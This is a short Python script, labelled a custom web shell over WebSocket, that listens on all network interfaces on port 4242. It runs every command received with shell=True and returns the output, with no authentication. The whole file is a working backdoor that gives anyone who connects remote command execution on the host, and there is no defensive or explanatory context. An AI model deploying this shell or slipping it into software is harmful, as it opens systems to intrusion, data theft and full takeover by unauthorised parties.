# Custom web shell over WebSocket
# Origial code from https://github.com/shelld3v/wsshell
# Created by SUP

import asyncio
from websockets import *
import websockets
import subprocess


async def reverse_shell(websocket):
    while True:
        cmd = await websocket.recv()
        response = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
        await websocket.send(response.stdout.decode() + response.stderr.decode())

async def main():
    async with serve(reverse_shell, "0.0.0.0", 4242) as websocket_server:
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())